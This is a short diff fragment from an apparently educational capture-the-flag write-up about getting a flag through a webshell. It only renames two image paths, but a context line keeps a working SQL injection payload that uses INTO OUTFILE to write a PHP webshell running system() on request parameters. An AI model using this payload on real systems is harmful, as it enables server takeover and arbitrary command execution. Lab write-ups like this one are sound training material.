@@ -197,9 +197,9 @@ Find the flag by using a webshell.
 search.php?port_code=cn'+union+select+""%2C'<%3Fphp+system(%24_REQUEST[0])%3B+%3F>'%2C+""%2C+""+into+outfile+'%2Fvar%2Fwww%2Fhtml%2Fshell.php'--+-
 ```
 
-<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
